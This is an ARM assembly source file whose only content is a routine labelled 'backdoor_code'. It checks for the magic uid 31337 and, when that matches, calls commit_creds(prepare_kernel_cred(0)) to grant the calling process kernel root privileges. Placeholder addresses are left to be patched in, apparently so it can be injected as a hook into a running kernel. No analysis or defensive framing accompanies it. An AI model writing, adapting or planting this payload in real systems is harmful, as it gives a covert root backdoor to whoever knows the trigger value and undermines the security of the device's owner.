.syntax unified

	.type backdoor_code,function
	.align 4
backdoor_code:
    # if uid == 31337
    stmfd sp!, {r6,lr}
    ldr r6, backdoor_uid
    cmp r0, r6
    bne go_back
    # commit_creds(prepare_kernel_cred(0))
    mov r0, #0
    ldr r6, prepare_kernel_cred
    blx r6
    ldr r6, commit_creds
    blx r6
    ldmfd sp, {r6,pc}
    .word 0x00000000
go_back:
    ldmfd sp!, {r6,lr}
    .word 0xf0f00020
    .word 0xf0f00020
    .word 0xf0f00020
    ldr pc, return_addr

backdoor_uid:
    .word 0x7a69
prepare_kernel_cred:
    .word 0xf0f00030
commit_creds:
    .word 0xf0f00040
return_addr:
    .word 0xf0f00010
